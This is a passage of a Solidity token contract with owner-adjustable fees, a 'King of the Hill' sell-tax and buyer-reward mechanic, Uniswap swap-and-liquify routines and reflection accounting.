        require (_totalFees[2].sub(_marketingFee[2]).add(kothSellersMarketingFee) < 25, "Total fees must be < 25%");
        _totalFees[0] = _totalFees[0].sub(_marketingFee[0]).add(defaultMarketingFee);
        _totalFees[1] = _totalFees[1].sub(_marketingFee[1]).add(kothBuyersMarketingFee);
        _totalFees[2] = _totalFees[2].sub(_marketingFee[2]).add(kothSellersMarketingFee);
        emit FeeChanged ("Marketing", _marketingFee[0], defaultMarketingFee, _marketingFee[1], kothBuyersMarketingFee, _marketingFee[2], kothSellersMarketingFee);
        _marketingFee[0] = defaultMarketingFee;
        _marketingFee[1] = kothBuyersMarketingFee;
        _marketingFee[2] = kothSellersMarketingFee;
    }

    function setLiquidityFeePercent(uint8 defaultLiquidityFee, uint8 kothBuyersLiquidityFee, uint8 kothSellersLiquidityFee) external onlyOwner() {
        require (_totalFees[0].sub(_liquidityFee[0]).add(defaultLiquidityFee) < 25, "Total fees must be < 25%");
        require (_totalFees[1].sub(_liquidityFee[1]).add(kothBuyersLiquidityFee) < 25, "Total fees must be < 25%");
        require (_totalFees[2].sub(_liquidityFee[2]).add(kothSellersLiquidityFee) < 25, "Total fees must be < 25%");
        _totalFees[0] = _totalFees[0].sub(_liquidityFee[0]).add(defaultLiquidityFee);
        _totalFees[1] = _totalFees[1].sub(_liquidityFee[1]).add(kothBuyersLiquidityFee);
        _totalFees[2] = _totalFees[2].sub(_liquidityFee[2]).add(kothSellersLiquidityFee);
        emit FeeChanged ("Liquidity", _liquidityFee[0], defaultLiquidityFee, _liquidityFee[1], kothBuyersLiquidityFee, _liquidityFee[2], kothSellersLiquidityFee);
        _liquidityFee[0] = defaultLiquidityFee;
        _liquidityFee[1] = kothBuyersLiquidityFee;
        _liquidityFee[2] = kothSellersLiquidityFee;
    }

    function setProductionsFeePercent(uint8 defaultProductionsFee, uint8 kothBuyersProductionsFee, uint8 kothSellersProductionsFee) external onlyOwner() {
        require (_totalFees[0].sub(_productionsFee[0]).add(defaultProductionsFee) < 25, "Total fees must be < 25%");
        require (_totalFees[1].sub(_productionsFee[1]).add(kothBuyersProductionsFee) < 25, "Total fees must be < 25%");
        require (_totalFees[2].sub(_productionsFee[2]).add(kothSellersProductionsFee) < 25, "Total fees must be < 25%");
        _totalFees[0] = _totalFees[0].sub(_productionsFee[0]).add(defaultProductionsFee);
        _totalFees[1] = _totalFees[1].sub(_productionsFee[1]).add(kothBuyersProductionsFee);
        _totalFees[2] = _totalFees[2].sub(_productionsFee[2]).add(kothSellersProductionsFee);
        emit FeeChanged ("Productions", _productionsFee[0], defaultProductionsFee, _productionsFee[1], kothBuyersProductionsFee, _productionsFee[2], kothSellersProductionsFee);
        _productionsFee[0] = defaultProductionsFee;
        _productionsFee[1] = kothBuyersProductionsFee;
        _productionsFee[2] = kothSellersProductionsFee;
    }

    function setKOTHDetails(uint8 kothWinnerAdditionalPercent, uint256 kothTriggerAmount, uint256 kothWinnableBuyAmount, uint256 kothLengthInSeconds) external onlyOwner() {
        emit KOTHDetailsChanged (
            _kothWinnerAdditionalPercent, 
            kothWinnerAdditionalPercent, 
            _kothTriggerAmount, 
            kothTriggerAmount, 
            _kothWinnableBuyAmount, 
            kothWinnableBuyAmount, 
            _kothLength, 
            kothLengthInSeconds
        );
        
        _kothWinnerAdditionalPercent = kothWinnerAdditionalPercent;
        _kothTriggerAmount = kothTriggerAmount;
        _kothWinnableBuyAmount = kothWinnableBuyAmount;
        _kothLength = kothLengthInSeconds;
    }

    // Determines the number of sells before KOTH is triggered. First term must be 0 as this is used when no sells have taken place
    // This is NOT cumulative. So if sell 1 adds 1% and sell 2 adds another 1% the first three terms should be 0,1,2 NOT 0,1,1
    function setAdditionalSellFeeSteps(uint8[] memory additionalSellFeeSteps) external onlyOwner() {
        require (additionalSellFeeSteps[0] == 0, "First term must be 0");
        uint8 maxAdditionalFeeStep;
        
        for (uint256 i = 1; i < additionalSellFeeSteps.length; i++) {
            if (additionalSellFeeSteps[i] > maxAdditionalFeeStep)
                maxAdditionalFeeStep = additionalSellFeeSteps[i];
        }
        
        require (_totalFees[0].sub(_maxAdditionalFeeStep).add(maxAdditionalFeeStep) < 25, "Total fees must be < 25%");
        _totalFees[0] = _totalFees[0].sub(_maxAdditionalFeeStep).add(maxAdditionalFeeStep);
        
        emit AdditionalFeeStepsChanged (_additionalSellFeeSteps, additionalSellFeeSteps);
        _additionalSellFeeSteps = additionalSellFeeSteps;
        _maxAdditionalFeeStep = maxAdditionalFeeStep;
    }

    function setSwapAndLiquifyEnabled(bool _enabled) external onlyOwner() {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    function setNumTokensSellToAddToLiquidity(uint256 numTokens) external onlyOwner() {
        require (numTokens < TOTAL_SUPPLY.div(100), "Liquidity sell amount too high");
        emit NumTokensSellToAddLiquidityChanged (_numTokensSellToAddToLiquidity, numTokens);
        _numTokensSellToAddToLiquidity = numTokens;
    }

    // withdraw any ERC20 tokens sent here by mistake
    function withdrawTokens(address _token) external onlyOwner() {
        require(_token != address(this), "Cannot withdraw this token");

        uint256 amount = IERC20(_token).balanceOf(address(this));
        IERC20(_token).transfer(owner(), amount);
        emit TokensWithdrawnFromContractAddress (_token, amount);
    }

     //to recieve ETH from uniswapV2Router when swapping
    receive() external payable {}

    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _tFeeTotal = _tFeeTotal.add(tFee);
    }

    function _getValues (uint256 tAmount, bool isBuy) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tReflectionFee, uint256 tOtherFees) = getTValues(tAmount, isBuy);
        (uint256 rAmount, uint256 rTransferAmount, uint256 rReflectionFee) = getRValues(tAmount, tReflectionFee, tOtherFees, _getRate());
        return (rAmount, rTransferAmount, rReflectionFee, tTransferAmount, tReflectionFee, tOtherFees);
    }

    function getTValues (uint256 tAmount, bool isBuy) private view returns (uint256, uint256, uint256) {
        uint8 feeType = isBuy && _inKOTH ? 1 : _inKOTH ? 2 : 0; //if in KOTH, different fee structure
        uint256 tReflectionFee = tAmount.mul(_reflectionFee[feeType]).div(100);
        
        // Calculate other fees together as we don't need to separate these out until later (see takeOtherFees)
        uint256 tOtherFees = tAmount.mul(_liquidityFee[feeType].add(_marketingFee[feeType]).add(_productionsFee[feeType])).div(100); 
        
        if (!isBuy && !_inKOTH) {
            // deal with additional sell fees
            uint8 addFee = _additionalSellFeeSteps[_numConsecutiveSells];
            tReflectionFee = tReflectionFee.add(tAmount.mul(addFee).mul(ADD_FEE_TO_REFLECTION_PERMILLE).div(100_000)); 
            tOtherFees = tOtherFees.add(tAmount.mul(addFee).mul(ADD_FEE_TO_MARKETING_PERMILLE.add(ADD_FEE_TO_LIQUIDITY_PERMILLE)).div(100_000));
        }
        
        uint256 tTransferAmount = tAmount.sub(tReflectionFee).sub(tOtherFees);
        return (tTransferAmount, tReflectionFee, tOtherFees);
    }

    function getRValues (uint256 tAmount, uint256 tReflectionFee, uint256 tOtherFees, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rReflectionFee = tReflectionFee.mul(currentRate);
        uint256 rOtherFees = tOtherFees.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rReflectionFee).sub(rOtherFees);
        return (rAmount, rTransferAmount, rReflectionFee);
    }

    function _getRate() private view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = TOTAL_SUPPLY;
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, TOTAL_SUPPLY);
            rSupply = rSupply.sub(_rOwned[_excluded[i]]);
            tSupply = tSupply.sub(_tOwned[_excluded[i]]);
        }
        if (rSupply < _rTotal.div(TOTAL_SUPPLY)) return (_rTotal, TOTAL_SUPPLY);
        return (rSupply, tSupply);
    }

    function isExcludedFromFee(address account) public view returns(bool) {
        return _isExcludedFromFee[account];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function getTokenValue (uint256 tokenAmount) private view returns (uint256) {
        address[] memory path = new address[](3);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        path[2] = BUSD;
        uint256[] memory valueinDollars = uniswapV2Router.getAmountsOut (tokenAmount, path);
        return valueinDollars[2];
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        if (_kothEndTime != 0 && block.timestamp > _kothEndTime) {
            _kothEndTime = 0;
            _inKOTH = false;
        }
            
        // If we have a winner then pay them, only if we have enough tokens and KOTH is over
        if (_currentKOTHWinner != address(0) && balanceOf (address(this)) >= _currentKOTHWinnings && !_inKOTH) {
            address winner = _currentKOTHWinner;
            _currentKOTHWinner = address(0);
            uint256 winnings = _currentKOTHWinnings;
            _currentKOTHWinnings = 0;
            _tokenTransfer (address(this), winner, winnings);
        }

        // is the token balance of this contract address over the min number of
        // tokens that we need to initiate a swap + liquidity lock?
        // also, don't get caught in a circular liquidity event.
        // also, don't swap & liquify if sender is uniswap pair.
        uint256 contractTokenBalance = balanceOf(address(this));
        
        // Can't swap if in KOTH or we have winnings to accrue
        bool overMinTokenBalance = contractTokenBalance >= _numTokensSellToAddToLiquidity && _kothEndTime == 0 && _currentKOTHWinnings == 0; 
        
        if (overMinTokenBalance && !inSwapAndLiquify && from != uniswapV2Pair && swapAndLiquifyEnabled && !_isExcludedFromFee[from])
            swapAndLiquify(contractTokenBalance.sub(_marketingTokens));

        // transfer amount, it will take tax, burn, liquidity fee
        _tokenTransfer (from, to, amount);
    }

    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        // split the contract balance into halves
        uint256 half = contractTokenBalance.div(2);
        uint256 otherHalf = contractTokenBalance.sub(half);

        // capture the contract's current ETH balance.
        // this is so that we can capture exactly the amount of ETH that the
        // swap creates, and not make the liquidity event include any ETH that
        // has been manually sent to the contract
        uint256 initialBalance = address(this).balance;

        // swap tokens for ETH
        swapTokensForEth(half.add(_marketingTokens)); 

        // how much ETH did we just swap into?
        uint256 newBalance = address(this).balance.sub(initialBalance);

        // add liquidity to uniswap
        uint256 marketingEth = addLiquidity(otherHalf, newBalance);
        _marketingTokens = 0;
        
        if (marketingEth > 0) {
            
            if (!feesInBUSD) {
                (bool successMarketing, ) = payable(_marketingAddress).call{ value: marketingEth }("");
                require (successMarketing, "Failed to send fees to Marketing Wallet");
            } else {
                swapEthForBUSDAndTransfer (marketingEth, _marketingAddress);
            }
        }

        emit SwapAndLiquify(half, newBalance, otherHalf);
    }
    
    
    function swapEthForBUSDAndTransfer (uint256 ethAmount, address recipient) private {
        address[] memory path = new address[](2);
        path[0] = uniswapV2Router.WETH();
        path[1] = BUSD;

        // make the swap
        uniswapV2Router.swapExactETHForTokens { value: ethAmount } (
            0,
            path,
            recipient,
            block.timestamp
        );
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private returns (uint256) {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        (,uint256 ethFromLiquidity,) = uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
        
        return (ethAmount - ethFromLiquidity);
    }
    
    // Sends fees to their destination addresses, ensuring the result will be shown correctly on blockchain viewing sites (eg polygonscan)
    function takeFee (uint256 tFeeAmount, address feeWallet, address sender) private {
        uint256 rFeeAmount = tFeeAmount.mul(_getRate());
        _rOwned[feeWallet] = _rOwned[feeWallet].add(rFeeAmount);
        
        if(_isExcluded[feeWallet])
            _tOwned[feeWallet] = _tOwned[feeWallet].add(tFeeAmount);
            
        emit Transfer(sender, feeWallet, tFeeAmount);
    }
    
    // Splits tOtherFees into its constiuent parts and sends each of them
    function _takeOtherFees (uint256 tOtherFees, address sender, bool isBuy) private {
        uint8 feeType = isBuy && _inKOTH ? 1 : _inKOTH ? 2 : 0; //if in KOTH, different fee structure
        uint8 addFee = isBuy || _inKOTH ? 0 : _additionalSellFeeSteps[_numConsecutiveSells]; // 0 if buying or inKOTH
        
        // Get all fees the same magnitude as the smallest possible fee (0.375% = 375/1000%)
        uint256 otherFeesDivisor = (_liquidityFee[feeType].add(_marketingFee[feeType]).add(_productionsFee[feeType])).mul(1000);
        // Add standard and additional fees together
        otherFeesDivisor = otherFeesDivisor.add(addFee.mul(ADD_FEE_TO_LIQUIDITY_PERMILLE.add(ADD_FEE_TO_MARKETING_PERMILLE)));
        
        uint256 productionsTokens = tOtherFees.mul(_productionsFee[feeType].mul(1000)).div(otherFeesDivisor);
        takeFee (productionsTokens, _productionsAddress, sender);
        
        uint256 liquidityTokens = tOtherFees.mul(_liquidityFee[feeType].mul(1000).add(addFee.mul(ADD_FEE_TO_LIQUIDITY_PERMILLE))).div(otherFeesDivisor);
        takeFee (liquidityTokens, address(this), sender);
        
        uint256 marketingTokens = tOtherFees.sub(liquidityTokens).sub(productionsTokens); 
        _marketingTokens = _marketingTokens.add(marketingTokens);
        takeFee (marketingTokens, address(this), sender);
    }

    //this method is responsible for taking all fee, if takeFee is true
    function _tokenTransfer(address sender, address recipient, uint256 tAmount) private {
        uint256 rAmount;
        uint256 rTransferAmount;
        uint256 rFee;
        uint256 tTransferAmount;
        uint256 tFee;
        uint256 tOtherFees;
        bool isBuy = sender == uniswapV2Pair;
        bool feesEnabled = true;

        //if any account belongs to _isExcludedFromFee account then remove the fee
        if(_isExcludedFromFee[sender] || _isExcludedFromFee[recipient])
            feesEnabled = false;
        
        if(!feesEnabled) {
            (rAmount,,,,,) = _getValues(tAmount, isBuy);
            rTransferAmount = rAmount;
            tTransferAmount = tAmount;
        } else {
            (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tOtherFees) = _getValues(tAmount, isBuy);
        }
        
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        
        if (_isExcluded[sender])
            _tOwned[sender] = _tOwned[sender].sub(tAmount);
            
        if (_isExcluded[recipient])
            _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
            
        if (tOtherFees > 0)
            _takeOtherFees(tOtherFees, sender, isBuy);
        
        if (tFee > 0)
            _reflectFee(rFee, tFee);
        
        emit Transfer(sender, recipient, tTransferAmount);
        
        if (sender != owner() && sender != address(this))
            makeKOTHChanges (sender, recipient, tAmount);
    }
    
    function makeKOTHChanges (address from, address to, uint256 amount) internal {
        if (to == uniswapV2Pair && from != address(this) && _numConsecutiveSells < _additionalSellFeeSteps.length - 1 && !_inKOTH) { 
            // Sell, haven't had KOTH number of sells and not in KOTH so increment taxes
            _numConsecutiveSells++;
            
            // If the sell is big enough to trigger KOTH then record this. KOTH will start on a large enough buy
            // Only set this state if we're not still trying to earn enough tokens to pay the last winner
            if (getTokenValue (amount) > _kothTriggerAmount && !_inKOTH && _currentKOTHWinner == address(0)) 
                _kothTriggerActive = true;
        } else if (to == uniswapV2Pair && from != address(this) && !_inKOTH && _currentKOTHWinner == address(0)) {
            // Sell whilst at maximum sell tax (only if not already in KOTH and no previous winner waiting to be paid)
            _kothTriggerActive = true;
        } else if (from == uniswapV2Pair) { 
            bool canStartKOTH = getTokenValue(amount) > _kothWinnableBuyAmount; // Is the buy large enough to win additional tokens?
            
            if (canStartKOTH && (block.timestamp <= _kothEndTime || _kothTriggerActive)) {
                // Buy can win, and we're within (or about to start) an active KOTH, record buyer in case this is the winning bid
                _currentKOTHWinner = to;
                _currentKOTHWinnings = amount.mul(_kothWinnerAdditionalPercent).div(100);
                
                if (_kothTriggerActive) {
                    _kothTriggerActive = false;
                    _kothEndTime = block.timestamp + _kothLength;
                    _inKOTH = true;
                }
            }
            
            if (canStartKOTH) {
                // Buy > winnable amount resets taxes
                _numConsecutiveSells = 0;
            }
        }
    }
}